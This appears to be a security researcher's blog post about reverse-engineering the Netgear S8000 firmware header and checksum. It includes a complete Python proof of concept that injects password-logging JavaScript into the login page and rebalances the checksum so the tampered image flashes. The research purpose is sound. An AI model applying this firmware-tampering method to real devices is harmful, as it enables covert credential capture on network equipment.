<!DOCTYPE html>
<html>
<head>
<title>0052-netgear-s8000-custom-firmware.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<h1 id="netgear-s8000-custom-firmware">Netgear S8000 Custom Firmware</h1>
<p>Published: June 12th, 2021</p>
<p>This blog post will detail how to craft custom firmware given a stock firmware image for the Netgear S8000 line of gaming switches.  This switch is an 8-port gigabit managed switch that has a built in Web interface for management. We will take a stock firmware image available from the vendor, make modifications to it, successfully flash it to the device and have the device still work as intended with our additional capabilities.</p>
<h2 id="is-this-a-vulnerability">Is this a vulnerability?</h2>
<p>I do not think of this as a vulnerability.  The firmware flashing process requires authentication to flash new images, and it is my opinion firmware signing is probably outside the threat model of most SOHO equipment.  At the very least, I do not believe the vendor can fix this issue with a software update.  As such I am releasing this research without first contacting the vendor. I believe there are legimate uses for creating custom firmware beyond those that lend themselves to offensive security.  I also believe without the proof of concept, there is no way for others to validate my findings. Also, I noticed during testing that this model of switch is not widely available through retailers anymore, so it may have been discontinued. In the end, it is the research process that is probably the most valuable here, so I am going to detail how I did this.</p>
<h2 id="firmware-statistics">Firmware Statistics</h2>
<p>We are going to be looking at three versions of firmware:</p>
<ul>
<li><code>1.7.1.0</code></li>
<li><code>1.7.0.7</code></li>
<li><code>1.7.0.6</code></li>
</ul>
<p><code>1.7.1.0</code> is the latest firmware as of this writing.  All the aforementioned firmware versions are available from the vendor website.The firmware is <code>0x15b2b4</code> (<code>1422004</code>) bytes in length.  The first thing to note is in all firmware versions we are considering, the file size is constant.</p>
<p>Most firmware images have a header before the actual firmware image, and this firmware image is no different. The first <code>0x14</code> (<code>20</code>) bytes are the firmware header.  How did we come to this conclusion though?</p>
<p>Let's look at the first <code>0x20</code> (<code>32</code>) bytes in the firmware images:</p>
<pre class="hljs"><code><div>$ head -c 32 GS808E_V1.7.1.0.bin | xxd
00000000: 1592 6535 0015 b2a0 0000 06e5 06b8 ffd7  ..e5............
00000010: 3322 55ff 0210 1602 1009 8f96 2232 2202  3&quot;U.........&quot;2&quot;.
</div></code></pre>
<p>Notice at offset <code>0x4</code> the binary data <code>0x0015b2a0</code>.  This is pretty close, but not exact, to the length of the firmware image.  <code>0x15b2b4</code> - <code>0x15b2a0</code> is <code>0x14</code>.  Combine this with the knowledge that most firmware images include the binary data length in the firmware header, and we have identified the length field as well as the header size.</p>
<p><code>1.7.0.7</code>:</p>
<pre class="hljs"><code><div>$ head -c 32 GS808E_V1.7.0.7.bin | xxd
00000000: 1592 6535 0015 b2a0 0000 05e5 06a2 0be1  ..e5............
00000010: 3322 55ff 0210 1602 1009 8f96 2232 2202  3&quot;U.........&quot;2&quot;.
</div></code></pre>
<p><code>1.7.0.6</code>:</p>
<pre class="hljs"><code><div>$ head -c 32 GS808E_V1.7.0.6.bin | xxd
00000000: 1592 6535 0015 b2a0 0000 0620 06a6 ae75  ..e5....... ...u
00000010: 3322 55ff 0210 1602 1009 8f96 2232 2202  3&quot;U.........&quot;2&quot;.
</div></code></pre>
<p>What are the other fields though? Looking at the other firmware images, the first four bytes are always the same: <code>0x15926535</code> most likely this is the firmware <code>magic</code> number.  Likewise the last four bytes of firmware header is constant across the firmware images: <code>0x332255ff</code>.  This may be some sort of trailer value to denote the end of the firmware header, but I am not sure.  It has no impact on our analysis, so we'll ignore it henceforth.</p>
<p>Let's look at the double word value at <code>0xc</code> - for each firmware version, the value is:</p>
<ul>
<li><code>1.7.1.0</code> - <code>0x06b8ffd7</code></li>
<li><code>1.7.0.7</code> - <code>0x06a20be1</code></li>
<li><code>1.7.0.6</code> - <code>0x06a6ae75</code></li>
</ul>
<p>All of these values are clustered around the same value.  I made the assumption that they are the checksum for the image. But how is the checksum calculated?</p>
<p>Usually in Netgear images the checksum is just the sum of all the bytes in the file other than the header.  If we add all the bytes together for each byte in a firmware image, we get the following values per version:</p>
<ul>
<li><code>1.7.1.0</code> - <code>0x06b8f3bb</code></li>
<li><code>1.7.0.7</code> - <code>0x06a1fec4</code></li>
<li><code>1.7.0.6</code> - <code>0x06a6a0cf</code></li>
</ul>
<p>The python checksum function:</p>
<pre class="hljs"><code><div><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_checksum</span><span class="hljs-params">(data)</span>:</span>
    csum = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> data:
        csum = csum + b
    <span class="hljs-keyword">return</span> csum
</div></code></pre>
<p>These values are close to, but not exact, to the firmware checksum. In the end I could not reconcile the difference.  I made the assumption though the the values I generated and the values in the firmware header were related.  I assumed that if I could make my modified images match the same value I calculated from the original data, I could pass the checksum.  This turned out to be a true assumption.</p>
<h2 id="picking-targets">Picking Targets</h2>
<p>Wanting to demonstrate security impact, I chose some to overwrite some JavaScript on the login page.  The payload I chose logs the user-supplied password out to the JavaScript console when the user clicks the <code>Log In</code> button.</p>
<p><img src="images/0052/login.PNG" alt="Login Page" title="Login Page Screenshot"></p>
<p>By default, the HTML returned for the Login page contains the following JavaScript code:</p>
<pre class="hljs"><code><div>$(<span class="hljs-built_in">document</span>).ready(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
    transMultipleLang(<span class="hljs-built_in">document</span>.body);
});
</div></code></pre>
<p>I decided I would overwrite this value with my payload:</p>
<pre class="hljs"><code><div>loginBtn.onclick = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>{ <span class="hljs-built_in">console</span>.log(password.value); }
</div></code></pre>
<p>The original JavaScrpt is about 92 bytes long.  To preserve the length of the payload string, I pad the difference between the payload and the original with <code>\n</code> (newline) characters.  This results in a payload string of the same length as the original but is also valid JavaScript. Once successfully flashed, the target user does not notice the difference unless they have the browser developer console displayed.</p>
<h2 id="balancing-the-binary">Balancing the Binary</h2>
<p>After we have replaced the original string with the payload string, we need to &quot;balance&quot; the modified firmware image so that it matches the original calculated checksum (NOT the checksum in the firmware image header). I wrote a balancing algorithm that works for at least the three latest vendor-provided firmware images; it may work for others but I did not test them.</p>
<p>Python balancing function</p>
<pre class="hljs"><code><div><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">balance</span><span class="hljs-params">(data, cksum, idx)</span>:</span>
    print(<span class="hljs-string">"Checksum to match: "</span> + str(cksum))
    checksum = generate_checksum(data)
    <span class="hljs-keyword">while</span> cksum != checksum:
        diff = checksum - cksum
        <span class="hljs-keyword">if</span> diff &gt;= <span class="hljs-number">0</span>:
            <span class="hljs-keyword">if</span> diff &gt; <span class="hljs-number">0xff</span>:
                data[idx] = <span class="hljs-number">0x1</span>
            <span class="hljs-keyword">else</span>:
                data[idx] = abs(data[idx] - diff)
        <span class="hljs-keyword">else</span>:
           <span class="hljs-keyword">if</span> diff &lt; <span class="hljs-number">-0xff</span>:
               data[idx] = <span class="hljs-number">0xff</span>
           <span class="hljs-keyword">else</span>:
               data[idx] = <span class="hljs-number">0xff</span> + diff

        idx = idx + <span class="hljs-number">1</span>
        checksum = generate_checksum(data)

    <span class="hljs-keyword">return</span> data
</div></code></pre>
<p>Honestly, I coded this function mostly on intuition and, although it works, I assume there are better ways of doing this type of transformation that I am simply not aware of. I would love to hear from you if you have a more performant way of &quot;balancing&quot; the binary.</p>
<p>Now that we can balance the firmware image, we need to select very carefully where in the binary data it will do the balancing.  I chose within a JSON string embedded in the binary:</p>
<pre class="hljs"><code><div>0013b9a0: 2022 5468 6520 6d61 7869 6d75 6d20 6e75   &quot;The maximum nu
0013b9b0: 6d62 6572 206f 6620 7365 7373 696f 6e73  mber of sessions
0013b9c0: 2068 6173 2062 6565 6e20 7265 6163 6865   has been reache
0013b9d0: 642e 2057 6169 7420 6120 6665 7720 6d69  d. Wait a few mi
0013b9e0: 6e75 7465 7320 616e 6420 7468 656e 2074  nutes and then t
0013b9f0: 7279 2061 6761 696e 2e22 3a20 7b0a 2020  ry again.&quot;: {.  
</div></code></pre>
<p>I wrote this all into a python script that can take a vendor-supplied stock firmware image and turn it into a custom image.  The proof of concept is provided here:</p>
<pre class="hljs"><code><div><span class="hljs-keyword">import</span> sys
fname = sys.argv[<span class="hljs-number">1</span>]
HEADER_SIZE = <span class="hljs-number">0x14</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_checksum</span><span class="hljs-params">(data)</span>:</span>
    csum = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> data:
        csum = csum + b
    <span class="hljs-keyword">return</span> csum

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">balance</span><span class="hljs-params">(data, cksum, idx)</span>:</span>
    print(<span class="hljs-string">"Checksum to match: "</span> + str(cksum))
    checksum = generate_checksum(data)
    <span class="hljs-keyword">while</span> cksum != checksum:
        diff = checksum - cksum
        <span class="hljs-keyword">if</span> diff &gt;= <span class="hljs-number">0</span>:
            <span class="hljs-keyword">if</span> diff &gt; <span class="hljs-number">0xff</span>:
                data[idx] = <span class="hljs-number">0x1</span>
            <span class="hljs-keyword">else</span>:
                data[idx] = abs(data[idx] - diff)
        <span class="hljs-keyword">else</span>:
           <span class="hljs-keyword">if</span> diff &lt; <span class="hljs-number">-0xff</span>:
               data[idx] = <span class="hljs-number">0xff</span>
           <span class="hljs-keyword">else</span>:
               data[idx] = <span class="hljs-number">0xff</span> + diff

        idx = idx + <span class="hljs-number">1</span>
        checksum = generate_checksum(data)

    <span class="hljs-keyword">return</span> data

<span class="hljs-keyword">with</span> open(fname, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
    to_overwrite = <span class="hljs-string">'"The maximum number of sessions has been reached. Wait a few minutes and then try again.":'</span>
    to_remove = <span class="hljs-string">"""$(document).ready(function(){\n            transMultipleLang(document.body);\n        });\n    """</span>
    payload = <span class="hljs-string">"loginBtn.onclick = function(e) { console.log(password.value); }\n"</span>
    payload_len = len(payload)
    padding = len(to_remove) - payload_len
    payload = payload.ljust(padding + payload_len, <span class="hljs-string">"\n"</span>)

    data = f.read()
    to_remove = bytearray(to_remove, encoding=<span class="hljs-string">"utf8"</span>)
    to_overwrite_idx = data.find(bytearray(to_overwrite, encoding=<span class="hljs-string">'utf8'</span>)) + <span class="hljs-number">1</span>
    to_replace_idx = data.find(to_remove)
    
    <span class="hljs-keyword">if</span> to_overwrite_idx &lt; <span class="hljs-number">0</span>:
        print(<span class="hljs-string">"To Overwrite not found, exiting"</span>)
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-keyword">if</span> to_replace_idx &lt; <span class="hljs-number">0</span>:
        print(<span class="hljs-string">"To Replace not found, exiting"</span>)
        sys.exit(<span class="hljs-number">1</span>)
        
    payload = bytearray(payload, encoding=<span class="hljs-string">"utf8"</span>)
    ocsum = generate_checksum(data[HEADER_SIZE:])
    original_len = len(data) - HEADER_SIZE
    print(<span class="hljs-string">"Original Checksum: 0x"</span> + str(hex(ocsum)) + <span class="hljs-string">" | "</span> + str(ocsum))
    print(<span class="hljs-string">"Original Length: 0x"</span> + str(hex(original_len)) + <span class="hljs-string">" | "</span> + str(original_len))
    data = data.replace(to_remove, payload)
    data = bytearray(data)
    data = data[:HEADER_SIZE] + balance(data[HEADER_SIZE:], ocsum, to_overwrite_idx)
    mcsum = generate_checksum(data[HEADER_SIZE:])
    print(<span class="hljs-string">"Balanced checksum: 0x"</span> + str(hex(mcsum)) + <span class="hljs-string">" | "</span> + str(mcsum))
    modified_len = len(data) - HEADER_SIZE
    print(<span class="hljs-string">"Balanced Length: 0x"</span> + str(hex(modified_len)) + <span class="hljs-string">" | "</span> + str(modified_len))

    <span class="hljs-keyword">if</span> ocsum != mcsum:
        print(<span class="hljs-string">"Checksums don't match, won't flash."</span>)
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-keyword">if</span> original_len !=  modified_len:
        print(<span class="hljs-string">"Lengths don't match, exiting..."</span>)
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-keyword">with</span> open(fname + <span class="hljs-string">".modified.bin"</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> fw:
        fw.write(bytes(data))
</div></code></pre>
<p>Please forgive my messy python. The script does some checksum and length checking at the end and won't write out the modified firmware file if those conditions are not met.</p>
<p>Now that we have a firmware image, we can test flashing it to the device through the standard firmware upgrade process available in the web UI.  The filename supplied must end in <code>.bin</code>, but other than that the filename is arbitrary. The script provided above creates a file based off the original firmware filename, and the outputed file ends in <code>.modified.bin</code>.</p>
<p>Now, when I was doing this work I repeatedly put my test device in a bad state.  As you can imagine, trying to flash custom firmware can result in the device becoming non-functional.  The way I got around this was I made a backup of the SPI NOR ROM by opening up the switch and attaching a clip to the chip. Using a bus pirate, I was able to dump the SPI ROM to a safe location.  Then, when I messed up the firmware image and rendered the switch useless, I could use the bus pirate to write the original SPI ROM image back to the switch and thereby make it operational again.</p>
<p><img src="images/0052/chipclip.png" alt="Chip clip" title="Chip Clip Photo"></p>
<p>After I flash my custom image, I see this when loading the login page:</p>
<p><img src="images/0052/login-payload.PNG" alt="Login Payload" title="Login Payload Screenshot"></p>
<p><img src="images/0052/login-devtools.PNG" alt="Login Devtools" title="Login Devtools Screenshot"></p>
<h2 id="other-notes">Other notes</h2>
<p>I could not disassemble this firmware image in Ghidra for the life of me. With some help (thanks @ReverseICS!) I was able to determine that the primary processor is a 8051 MCU, but even then I couldn't get the binary to load in Ghidra properly. As mentioned above, the firmware image provided by the vendor is about 1.4MB in size; the SPI ROM was 4MB.  There is additional code in the SPI ROM - it looks like it handles the booting of the device and then transferring control over to the vendor-supplied firmware.  The board uses a Realtek <code>RTL8370-GR</code> which is a ethernet PHY, but also contains a 8051 MCU.</p>
<p><a href="/">Home</a></p>

</body>
</html>
